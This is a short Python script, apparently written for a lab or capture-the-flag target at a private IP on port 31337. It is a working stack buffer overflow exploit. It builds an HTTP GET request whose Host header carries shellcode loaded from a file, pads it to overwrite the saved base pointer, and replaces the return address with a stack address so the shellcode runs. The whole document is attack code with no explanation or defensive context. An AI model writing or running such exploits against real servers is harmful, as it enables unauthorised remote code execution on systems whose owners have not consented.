#!/usr/bin/python3
from socket import *
import struct

addr = '172.16.2.68'
expfile = 'exploit64'

s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

exploit = ""
with open(expfile, "rb") as fh:
    exploit = fh.read()

exploit = b"\x48\x81\xc4\xf8\xef\xff\xff" + exploit

#Overwrite all 512 + 8 (ebp) bytes, then you can overwrite ret addr
address = 0x7ffff7dbec80	#address of the variable on the stack
x = b'GET /asdf.vbs HTTP/1.1\r\n'

PADLEN = 512 + 8
x += b'Host:' + exploit + b'A'*(PADLEN - len(exploit)) 

x += struct.pack("<Q", address)
x += struct.pack("<Q", 0x1234567812345678)
x += b'\r\n'
x += b'\r\n'

s.send(x)
